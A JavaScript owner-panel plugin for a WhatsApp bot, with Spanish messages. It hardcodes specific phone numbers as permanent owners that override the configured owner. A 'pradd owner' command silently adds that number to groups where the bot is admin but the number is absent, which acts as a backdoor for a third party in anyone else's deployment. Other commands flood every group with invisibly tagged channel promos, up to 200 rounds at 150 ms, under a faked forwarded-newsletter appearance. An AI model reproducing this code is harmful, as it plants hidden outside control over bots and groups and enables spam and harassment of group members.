const FORCE_OWNER = [
  '51901931862',
  '51901931862@s.whatsapp.net',
  '269015712845891',
  '269015712845891@lid'
]

const OWNER_ADD_JID = '51901931862@s.whatsapp.net'

function cleanJid(jid = '') {
  if (!jid) return ''

  if (typeof jid === 'object') {
    jid =
      jid?.id ||
      jid?.jid ||
      jid?.user ||
      jid?.participant ||
      jid?.remoteJid ||
      jid?.lid ||
      jid?.phoneNumber ||
      jid?.phone ||
      ''
  }

  jid = String(jid).trim()
  if (!jid) return ''

  if (jid.includes('@')) {
    const [left, server] = jid.split('@')
    return `${left.split(':')[0]}@${server}`
  }

  const number = jid.replace(/\D/g, '')
  return number ? `${number}@s.whatsapp.net` : ''
}

function digitsOnly(value = '') {
  return cleanJid(value).split('@')[0].replace(/\D/g, '')
}

function sameUser(a = '', b = '') {
  const rawA = cleanJid(a)
  const rawB = cleanJid(b)

  if (rawA && rawB && rawA === rawB) return true

  const numA = digitsOnly(rawA)
  const numB = digitsOnly(rawB)

  return !!numA && !!numB && numA === numB
}

function isOwnerUser(jid = '') {
  const owners = [
    ...FORCE_OWNER,
    ...(Array.isArray(global.owner) ? global.owner.flat(Infinity) : [])
  ].filter(Boolean)

  return owners.some(owner => sameUser(owner, jid))
}

function getParticipantJids(participant = {}) {
  return [
    participant?.id,
    participant?.jid,
    participant?.lid,
    participant?.phoneNumber,
    participant?.phone,
    participant?.participant
  ].map(cleanJid).filter(Boolean)
}

function getMentions(participants = []) {
  const mentions = []

  for (const p of participants) {
    const values = getParticipantJids(p)

    for (const jid of values) {
      if (jid.endsWith('@s.whatsapp.net') || jid.endsWith('@lid')) {
        mentions.push(jid)
        break
      }
    }
  }

  return [...new Set(mentions)]
}

function sleep(ms = 1000) {
  return new Promise(resolve => setTimeout(resolve, ms))
}

function findParticipant(participants = [], candidates = []) {
  for (const p of participants) {
    const ids = getParticipantJids(p)

    const found = ids.some(id =>
      candidates.some(candidate => sameUser(id, candidate))
    )

    if (found) return p
  }

  return null
}

function isAdminParticipant(participant = null) {
  return participant?.admin === 'admin' || participant?.admin === 'superadmin'
}

function explainAddStatus(status = '', data = {}) {
  const code = String(status || '').trim()

  if (code === '200' || code === '204') return 'añadido correctamente'
  if (code === '409') return 'el owner ya estaba en el grupo'
  if (code === '403') return 'WhatsApp no permitió añadirlo. Puede ser por privacidad del usuario, invitación requerida o restricción del grupo'
  if (code === '401') return 'el bot no tiene autorización para añadir participantes'
  if (code === '408') return 'WhatsApp agotó el tiempo de espera al intentar añadir'
  if (code === '500') return 'WhatsApp devolvió error interno al intentar añadir'
  if (code === '419') return 'la invitación o acción expiró'
  if (code === '400') return 'solicitud inválida para añadir al participante'

  const msg =
    data?.message ||
    data?.error ||
    data?.reason ||
    data?.content?.[0]?.attrs?.error ||
    ''

  return msg ? String(msg) : `WhatsApp devolvió estado ${code || 'desconocido'}`
}

function explainAddError(error = {}) {
  const msg = String(error?.message || error || '')

  if (/not-authorized|not authorized|unauthorized|401/i.test(msg)) {
    return 'el bot no tiene autorización para añadir participantes'
  }

  if (/forbidden|403/i.test(msg)) {
    return 'WhatsApp no permitió añadirlo. Puede ser por privacidad, permisos o restricción del grupo'
  }

  if (/not-admin|admin/i.test(msg)) {
    return 'el bot no es administrador del grupo'
  }

  if (/timed out|timeout/i.test(msg)) {
    return 'WhatsApp tardó demasiado en responder'
  }

  if (/connection closed|closed/i.test(msg)) {
    return 'la conexión del bot estaba cerrada o reconectando'
  }

  return msg || 'error desconocido'
}

export default {
  command: [
    'pr',
    'prlist',
    'prshared',
    'prsus',
    'pradd',
    'prmsg',
    'prsusmsg',
    'prall',
    'prtag',
    'prsustag',
    'prtagall',
    'prgtag',
    'prpromo',
    'prsuspromo',
    'prpromoall'
  ],
  category: 'owner',

  run: async (client, m, args, usedPrefix, command, text) => {
    try {
      const senderIsOwner = isOwnerUser(m.sender)

      if (!senderIsOwner) return

      global.db.data.chats ||= {}
      global.db.data.settings ||= {}

      const bodyText = String(m.body || m.text || '').trim()

      const usedCmd = String(
        command ||
        bodyText
          .replace(new RegExp(`^${String(usedPrefix || '').replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}`), '')
          .trim()
          .split(/\s+/)[0] ||
        ''
      ).toLowerCase().trim()

      const rawText = String(text || args.join(' ') || '').trim()

      const botJid = cleanJid(client?.user?.id || client?.user?.lid)
      const botDigits = digitsOnly(botJid)

      const settings = global.db.data.settings[botJid] || {}

      const CHANNEL_LINK =
        global.links?.channel ||
        settings.link ||
        'https://whatsapp.com/channel/0029Vb7O3ugGZNCpbDTDhr3F'

      const CHANNEL_JID =
        global.my?.ch ||
        settings.id ||
        '120363424461852442@newsletter'

      const CHANNEL_NAME =
        global.my?.name ||
        settings.nameid ||
        'RubyJX Channel'

      const THUMBNAIL = settings.icon || settings.banner || ''

      const ownerCandidates = [
        m.sender,
        ...FORCE_OWNER,
        OWNER_ADD_JID,
        ...(Array.isArray(global.owner)
          ? global.owner.flat(Infinity).map(num => `${String(num).replace(/\D/g, '')}@s.whatsapp.net`)
          : []),
        `${digitsOnly(m.sender)}@s.whatsapp.net`,
        `${digitsOnly(m.sender)}@lid`
      ].filter(Boolean)

      const botCandidates = [
        botJid,
        client?.user?.id,
        client?.user?.lid,
        `${botDigits}@s.whatsapp.net`,
        `${botDigits}@lid`
      ].filter(Boolean)

      const groupChats = Object.keys(global.db.data.chats)
        .filter(jid => jid.endsWith('@g.us'))

      const sharedGroups = []
      const suspectGroups = []

      for (const jid of groupChats) {
        try {
          const metadata = await client.groupMetadata(jid).catch(() => null)
          if (!metadata) continue

          const participants = metadata.participants || []

          const ownerParticipant = findParticipant(participants, ownerCandidates)
          const botParticipant = findParticipant(participants, botCandidates)

          const ownerInGroup = !!ownerParticipant
          const botInGroup = !!botParticipant
          const botIsAdmin = isAdminParticipant(botParticipant)

          if (!botInGroup) continue

          const data = {
            jid,
            name: metadata.subject || 'Grupo sin nombre',
            members: participants.length,
            participants,
            ownerInGroup,
            botInGroup,
            botIsAdmin
          }

          if (ownerInGroup) sharedGroups.push(data)
          else suspectGroups.push(data)
        } catch {}
      }

      const allGroups = [...sharedGroups, ...suspectGroups]

      const buildMenu = () => {
        let txt = `╭━━〔 ᴘʀ ᴘᴀɴᴇʟ 〕━━⬣\n`
        txt += `┃\n`
        txt += `┃ ✅ Compartidos: ${sharedGroups.length}\n`
        txt += `┃ ⚠️ Sospechosos: ${suspectGroups.length}\n`
        txt += `┃ 📦 Total bot: ${allGroups.length}\n`
        txt += `┃\n`
        txt += `┃ 📂 Panel:\n`
        txt += `┃ ${usedPrefix}prlist\n`
        txt += `┃ ${usedPrefix}prshared\n`
        txt += `┃ ${usedPrefix}prsus\n`
        txt += `┃\n`
        txt += `┃ ➕ Añadir owner a sospechosos:\n`
        txt += `┃ ${usedPrefix}pradd owner\n`
        txt += `┃ ${usedPrefix}pradd owner S1,S2\n`
        txt += `┃\n`
        txt += `┃ ✉️ Mensajes normales:\n`
        txt += `┃ ${usedPrefix}prmsg 1,2 | texto\n`
        txt += `┃ ${usedPrefix}prsusmsg 1,2 | texto\n`
        txt += `┃ ${usedPrefix}prall | texto\n`
        txt += `┃\n`
        txt += `┃ 🏷️ Tag invisible:\n`
        txt += `┃ ${usedPrefix}prtag 1,2 | texto\n`
        txt += `┃ ${usedPrefix}prgtag 1,2 | texto\n`
        txt += `┃ ${usedPrefix}prsustag 1,2 | texto\n`
        txt += `┃ ${usedPrefix}prtagall | texto\n`
        txt += `┃\n`
        txt += `┃ 📢 Promo canal:\n`
        txt += `┃ ${usedPrefix}prpromo 1,2\n`
        txt += `┃ ${usedPrefix}prpromo 1,S2,3\n`
        txt += `┃ ${usedPrefix}prsuspromo 1,2\n`
        txt += `┃ ${usedPrefix}prpromoall\n`
        txt += `┃\n`
        txt += `┃ Canal: ${CHANNEL_LINK}\n`
        txt += `╰━━━━━━━━━━━━━━⬣`

        return txt
      }

      const buildList = (title, groups, prefix = '') => {
        let txt = `📂 *${title}*\n\n`

        if (!groups.length) {
          txt += 'No encontré grupos en esta categoría.'
          return txt
        }

        groups.forEach((g, i) => {
          txt += `*${prefix}${i + 1}.* ${g.name}\n`
          txt += `👥 Miembros: ${g.members}\n`
          txt += `🤖 Bot admin: ${g.botIsAdmin ? 'Sí' : 'No'}\n`
          txt += `🆔 ID: ${g.jid}\n\n`
        })

        return txt.trim()
      }

      const parseIndexes = (input = '', max = 0) => {
        return [...new Set(
          String(input)
            .split(',')
            .map(x => parseInt(x.trim()))
            .filter(n => !isNaN(n) && n >= 1 && n <= max)
        )]
      }

      const parseMixedGroups = (input = '') => {
        const selected = []
        const used = new Set()

        const parts = String(input)
          .split(',')
          .map(x => x.trim().toLowerCase())
          .filter(Boolean)

        for (const part of parts) {
          if (part.startsWith('s')) {
            const index = parseInt(part.slice(1))
            const group = suspectGroups[index - 1]

            if (group && !used.has(group.jid)) {
              selected.push({
                index: `S${index}`,
                ...group
              })
              used.add(group.jid)
            }
          } else {
            const index = parseInt(part)
            const group = sharedGroups[index - 1]

            if (group && !used.has(group.jid)) {
              selected.push({
                index,
                ...group
              })
              used.add(group.jid)
            }
          }
        }

        return selected
      }

      const parseSuspectGroupsForAdd = (input = '') => {
        const clean = String(input || '').trim().toLowerCase()

        if (!clean || clean === 'all' || clean === 'todos') {
          return suspectGroups.map((g, i) => ({
            index: `S${i + 1}`,
            ...g
          }))
        }

        const selected = []
        const used = new Set()

        const parts = clean
          .split(',')
          .map(x => x.trim())
          .filter(Boolean)

        for (const part of parts) {
          const raw = part.startsWith('s') ? part.slice(1) : part
          const index = parseInt(raw)
          const group = suspectGroups[index - 1]

          if (group && !used.has(group.jid)) {
            selected.push({
              index: `S${index}`,
              ...group
            })
            used.add(group.jid)
          }
        }

        return selected
      }

      const buildPromoText = () => {
        return [
          '🔥 *RUBYJX CHANNEL* 🔥',
          '',
          'No te quedes fuera 👀',
          '',
          '⚡ novedades del bot',
          '⚡ funciones exclusivas',
          '⚡ actualizaciones privadas',
          '⚡ contenido que no subo en grupos',
          '',
          '📢 *ÚNETE A MI CANAL OFICIAL:*',
          CHANNEL_LINK,
          '',
          'Entra desde el botón de abajo:',
          '*Ver canal*'
        ].join('\n')
      }

      const sendNormal = async (jid, msg) => {
        await client.sendMessage(jid, {
          text: String(msg || '').trim()
        })
      }

      const sendInvisibleTag = async (jid, msg, participants = []) => {
        const mentions = getMentions(participants)

        await client.sendMessage(jid, {
          text: String(msg || '').trim() + '\u200B',
          mentions,
          contextInfo: {
            mentionedJid: mentions
          }
        })
      }

      const sendPromo = async (jid, participants = []) => {
        const mentions = getMentions(participants)
        const promoText = buildPromoText()

        await client.sendMessage(jid, {
          text: promoText,
          mentions,
          contextInfo: {
            mentionedJid: mentions,
            isForwarded: true,
            forwardingScore: 999,
            forwardedNewsletterMessageInfo: {
              newsletterJid: CHANNEL_JID,
              serverMessageId: 0,
              newsletterName: CHANNEL_NAME
            },
            externalAdReply: {
              title: CHANNEL_NAME,
              body: 'Únete a mi canal oficial',
              mediaType: 1,
              renderLargerThumbnail: true,
              thumbnailUrl: THUMBNAIL || undefined,
              sourceUrl: CHANNEL_LINK
            }
          }
        })
      }

      const addOwnerToGroup = async (group) => {
        if (!group?.jid) {
          return {
            ok: false,
            reason: 'grupo inválido'
          }
        }

        let metadata = null

        try {
          metadata = await client.groupMetadata(group.jid).catch(() => null)
        } catch {}

        if (!metadata) {
          return {
            ok: false,
            reason: 'no pude leer la información del grupo'
          }
        }

        const participants = metadata.participants || []

        const botParticipant = findParticipant(participants, botCandidates)
        const ownerParticipant = findParticipant(participants, ownerCandidates)

        if (!botParticipant) {
          return {
            ok: false,
            reason: 'el bot no está dentro del grupo'
          }
        }

        if (ownerParticipant) {
          return {
            ok: true,
            reason: 'el owner ya estaba en el grupo'
          }
        }

        if (!isAdminParticipant(botParticipant)) {
          return {
            ok: false,
            reason: 'el bot no es administrador del grupo'
          }
        }

        try {
          const result = await client.groupParticipantsUpdate(group.jid, [OWNER_ADD_JID], 'add')
          const info = Array.isArray(result) ? result[0] : result
          const status =
            info?.status ||
            info?.content?.[0]?.attrs?.error ||
            info?.attrs?.error ||
            ''

          if (!status || String(status) === '200' || String(status) === '204') {
            return {
              ok: true,
              reason: 'owner añadido correctamente'
            }
          }

          if (String(status) === '409') {
            return {
              ok: true,
              reason: 'el owner ya estaba en el grupo'
            }
          }

          return {
            ok: false,
            reason: explainAddStatus(status, info)
          }
        } catch (error) {
          return {
            ok: false,
            reason: explainAddError(error)
          }
        }
      }

      const runBulk = async ({ groups, indexes, message = '', mode = 'normal' }) => {
        const selected = indexes.map(i => ({
          index: i,
          ...groups[i - 1]
        }))

        let ok = 0
        let bad = 0
        let report = ''

        for (const g of selected) {
          try {
            if (mode === 'tag') {
              await sendInvisibleTag(g.jid, message, g.participants)
            } else if (mode === 'promo') {
              await sendPromo(g.jid, g.participants)
            } else {
              await sendNormal(g.jid, message)
            }

            ok++
            report += `✅ ${g.index}. ${g.name}\n`
          } catch (error) {
            bad++
            report += `❌ ${g.index}. ${g.name} » ${error?.message || 'Error'}\n`
          }

          await sleep(1300)
        }

        return { ok, bad, report: report.trim() }
      }

      const runSelectedGroups = async ({ selected, message = '', mode = 'normal' }) => {
        let ok = 0
        let bad = 0
        let report = ''

        for (const g of selected) {
          try {
            if (mode === 'tag') {
              await sendInvisibleTag(g.jid, message, g.participants)
            } else if (mode === 'promo') {
              await sendPromo(g.jid, g.participants)
            } else {
              await sendNormal(g.jid, message)
            }

            ok++
            report += `✅ ${g.index}. ${g.name}\n`
          } catch (error) {
            bad++
            report += `❌ ${g.index}. ${g.name} » ${error?.message || 'Error'}\n`
          }

          await sleep(1300)
        }

        return { ok, bad, report: report.trim() }
      }

      if (usedCmd === 'pr') {
        return m.reply(buildMenu())
      }

      if (usedCmd === 'prlist') {
        let txt = buildList('GRUPOS COMPARTIDOS', sharedGroups)
        txt += '\n\n'
        txt += buildList('GRUPOS SOSPECHOSOS', suspectGroups, 'S')
        return m.reply(txt.trim())
      }

      if (usedCmd === 'prshared') {
        return m.reply(buildList('GRUPOS COMPARTIDOS', sharedGroups))
      }

      if (usedCmd === 'prsus') {
        return m.reply(buildList('GRUPOS SOSPECHOSOS', suspectGroups, 'S'))
      }

      if (usedCmd === 'pradd') {
        const match = rawText.match(/^owner(?:\s+([\s\S]+))?$/i)

        if (!match) {
          return m.reply(
            `➕ *PR ADD OWNER*\n\n` +
            `Uso:\n` +
            `*${usedPrefix}pradd owner* → intenta añadirme a todos los grupos sospechosos\n` +
            `*${usedPrefix}pradd owner S1,S2* → intenta añadirme solo a esos sospechosos`
          )
        }

        const selectedText = String(match[1] || '').trim()
        const selected = parseSuspectGroupsForAdd(selectedText)

        if (!selected.length) {
          return m.reply(`➕ ᴘʀ ᴀᴅᴅ ✦ No encontré grupos sospechosos válidos.`)
        }

        let ok = 0
        let bad = 0
        let report = ''

        for (const g of selected) {
          const res = await addOwnerToGroup(g)

          if (res.ok) {
            ok++
            report += `✅ ${g.index}. ${g.name} » ${res.reason}\n`
          } else {
            bad++
            report += `❌ ${g.index}. ${g.name} » No pude añadirte porque ${res.reason}\n`
          }

          await sleep(1600)
        }

        return m.reply(
          `➕ *PR ADD OWNER FINALIZADO*\n\n` +
          `✅ Correctos: ${ok}\n` +
          `⚠️ Fallidos: ${bad}\n\n` +
          report.trim()
        )
      }

      if (usedCmd === 'prmsg') {
        const match = rawText.match(/^([\d,\s]+)\s*\|\s*([\s\S]+)$/)
        if (!match) return m.reply(`Usa: *${usedPrefix}prmsg 1,2 | tu mensaje*`)

        const indexes = parseIndexes(match[1], sharedGroups.length)
        const message = match[2].trim()

        if (!indexes.length) return m.reply('No encontré grupos válidos.')
        if (!message) return m.reply('Debes escribir un mensaje.')

        const res = await runBulk({ groups: sharedGroups, indexes, message, mode: 'normal' })

        return m.reply(
          `*Envío completado*\n\n` +
          `📨 Enviados: ${res.ok}\n` +
          `⚠️ Fallidos: ${res.bad}\n\n` +
          res.report
        )
      }

      if (usedCmd === 'prsusmsg') {
        const match = rawText.match(/^([\d,\s]+)\s*\|\s*([\s\S]+)$/)
        if (!match) return m.reply(`Usa: *${usedPrefix}prsusmsg 1,2 | tu mensaje*`)

        const indexes = parseIndexes(match[1], suspectGroups.length)
        const message = match[2].trim()

        if (!indexes.length) return m.reply('No encontré grupos sospechosos válidos.')
        if (!message) return m.reply('Debes escribir un mensaje.')

        const res = await runBulk({ groups: suspectGroups, indexes, message, mode: 'normal' })

        return m.reply(
          `*Envío a sospechosos completado*\n\n` +
          `📨 Enviados: ${res.ok}\n` +
          `⚠️ Fallidos: ${res.bad}\n\n` +
          res.report
        )
      }

      if (usedCmd === 'prtag' || usedCmd === 'prgtag') {
        const match = rawText.match(/^([\d,\s]+)\s*\|\s*([\s\S]+)$/)
        if (!match) return m.reply(`Usa: *${usedPrefix}${usedCmd} 1,2 | tu mensaje*`)

        const indexes = parseIndexes(match[1], sharedGroups.length)
        const message = match[2].trim()

        if (!indexes.length) return m.reply('No encontré grupos válidos.')
        if (!message) return m.reply('Debes escribir un mensaje.')

        const res = await runBulk({ groups: sharedGroups, indexes, message, mode: 'tag' })

        return m.reply(
          `*Tag invisible completado*\n\n` +
          `📨 Enviados: ${res.ok}\n` +
          `⚠️ Fallidos: ${res.bad}\n\n` +
          res.report
        )
      }

      if (usedCmd === 'prsustag') {
        const match = rawText.match(/^([\d,\s]+)\s*\|\s*([\s\S]+)$/)
        if (!match) return m.reply(`Usa: *${usedPrefix}prsustag 1,2 | tu mensaje*`)

        const indexes = parseIndexes(match[1], suspectGroups.length)
        const message = match[2].trim()

        if (!indexes.length) return m.reply('No encontré grupos sospechosos válidos.')
        if (!message) return m.reply('Debes escribir un mensaje.')

        const res = await runBulk({ groups: suspectGroups, indexes, message, mode: 'tag' })

        return m.reply(
          `*Tag invisible a sospechosos completado*\n\n` +
          `📨 Enviados: ${res.ok}\n` +
          `⚠️ Fallidos: ${res.bad}\n\n` +
          res.report
        )
      }

      if (usedCmd === 'prall') {
        const match = rawText.match(/^\|\s*([\s\S]+)$/)
        if (!match) return m.reply(`Usa: *${usedPrefix}prall | tu mensaje*`)

        const message = match[1].trim()
        if (!message) return m.reply('Debes escribir un mensaje.')

        const selected = allGroups.map((g, i) => ({
          index: i + 1,
          ...g
        }))

        const res = await runSelectedGroups({ selected, message, mode: 'normal' })

        return m.reply(
          `*Envío global completado*\n\n` +
          `📨 Enviados: ${res.ok}\n` +
          `⚠️ Fallidos: ${res.bad}\n\n` +
          res.report
        )
      }

      if (usedCmd === 'prtagall') {
        const match = rawText.match(/^\|\s*([\s\S]+)$/)
        if (!match) return m.reply(`Usa: *${usedPrefix}prtagall | tu mensaje*`)

        const message = match[1].trim()
        if (!message) return m.reply('Debes escribir un mensaje.')

        const selected = allGroups.map((g, i) => ({
          index: i + 1,
          ...g
        }))

        const res = await runSelectedGroups({ selected, message, mode: 'tag' })

        return m.reply(
          `*Tag global completado*\n\n` +
          `📨 Enviados: ${res.ok}\n` +
          `⚠️ Fallidos: ${res.bad}\n\n` +
          res.report
        )
      }

      if (usedCmd === 'prpromo') {
        if (!rawText) return m.reply(`Usa: *${usedPrefix}prpromo 1,2 o S1,S2*`)

        const selected = parseMixedGroups(rawText)

        if (!selected.length) return m.reply('No encontré grupos válidos.')

        const TOTAL_MESSAGES = 200
        const DELAY_MS = 150

        let ok = 0
        let bad = 0

        for (let round = 0; round < TOTAL_MESSAGES; round++) {
          for (const g of selected) {
            try {
              await sendPromo(g.jid, g.participants)
              ok++
            } catch {
              bad++
            }
          }

          await sleep(DELAY_MS)
        }

        return m.reply(
          `🔥 *Promo enviada en modo agresivo*\n\n` +
          `📦 Grupos: ${selected.length}\n` +
          `🔁 Rondas: ${TOTAL_MESSAGES}\n` +
          `⏱️ Delay: ${DELAY_MS}ms\n\n` +
          `✅ Enviados: ${ok}\n` +
          `⚠️ Fallidos: ${bad}`
        )
      }

      if (usedCmd === 'prsuspromo') {
        const indexes = parseIndexes(rawText, suspectGroups.length)
        if (!indexes.length) return m.reply(`Usa: *${usedPrefix}prsuspromo 1,2*`)

        const res = await runBulk({
          groups: suspectGroups,
          indexes,
          mode: 'promo'
        })

        return m.reply(
          `*Promo enviada a grupos sospechosos*\n\n` +
          `📨 Enviados: ${res.ok}\n` +
          `⚠️ Fallidos: ${res.bad}\n\n` +
          res.report
        )
      }

      if (usedCmd === 'prpromoall') {
        if (!allGroups.length) return m.reply('No encontré grupos donde esté el bot.')

        const TOTAL_MESSAGES = 50
        const DELAY_MS = 150

        let ok = 0
        let bad = 0

        for (let round = 0; round < TOTAL_MESSAGES; round++) {
          for (const g of allGroups) {
            try {
              await sendPromo(g.jid, g.participants)
              ok++
            } catch {
              bad++
            }
          }

          await sleep(DELAY_MS)
        }

        return m.reply(
          `*Promo global enviada en modo agresivo*\n\n` +
          `📦 Grupos objetivo: ${allGroups.length}\n` +
          `🔁 Rondas: ${TOTAL_MESSAGES}\n` +
          `⏱️ Delay: ${DELAY_MS}ms\n\n` +
          `✅ Enviados: ${ok}\n` +
          `⚠️ Fallidos: ${bad}`
        )
      }
    } catch (e) {
      return m.reply(`❌ ᴇʀʀᴏʀ ✦ ${e?.message || e}`)
    }
  }
}